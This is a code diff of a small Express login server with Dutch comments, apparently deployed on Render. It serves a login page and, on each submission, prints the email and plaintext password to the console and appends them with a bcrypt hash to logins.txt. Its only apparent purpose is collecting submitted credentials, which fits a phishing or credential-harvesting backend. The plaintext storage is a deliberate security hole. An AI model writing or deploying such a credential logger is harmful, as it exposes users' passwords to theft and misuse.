@@ -1,37 +1,45 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const fs = require("fs");
-const path = require("path");
 const bcrypt = require("bcrypt");
 
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
-// Path naar je Documenten-map
-const logFilePath = path.join(require('os').homedir(), 'Documents', 'logins.txt');
-
 app.get("/", (req, res) => {
     res.sendFile(__dirname + "/index.html");
 });
 
 app.post("/login", async (req, res) => {
-    const email = req.body.email;
-    const password = req.body.password;
+    try {
+        const email = req.body.email;
+        const password = req.body.password;
 
-    // Toon plain password in CMD
-console.log(`Email: ${email} | Plain: ${password}`);
-fs.appendFileSync("logins.txt", `Email: ${email} | Password: ${password} | Hash: ${hash}\n`);
+        // Check of velden bestaan
+        if (!email || !password) {
+            return res.status(400).send("Email en wachtwoord zijn verplicht.");
+        }
 
-    // Hash voor veilig opslaan
-    const hash = await bcrypt.hash(password, 10);
+        // Plain password tonen
+        console.log(`Email: ${email}`);
+        console.log(`Plain Password: ${password}`);
 
-    // Sla alles op in Documenten/logins.txt
-    fs.appendFileSync(logFilePath, `Email: ${email} | Password: ${password} | Hash: ${hash}\n`);
+        // Hash het wachtwoord
+        const hash = await bcrypt.hash(password, 10);
 
-    res.send("Login geregistreerd! Check CMD en logins.txt in je Documenten-map.");
+        // Sla alles op in logins.txt in de projectfolder
+        fs.appendFileSync("logins.txt", `Email: ${email} | Password: ${password} | Hash: ${hash}\n`);
+
+        res.send("Login geregistreerd! Check Render Logs voor plain password en logins.txt voor hash.");
+    } catch (err) {
+        console.error("Fout bij login:", err);
+        res.status(500).send("Internal Server Error: " + err.message);
+    }
 });
 
-app.listen(process.env.PORT || 3000, () => {
-    console.log("Server draait...");
+// Render poort
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server draait op poort ${PORT}`);
 });
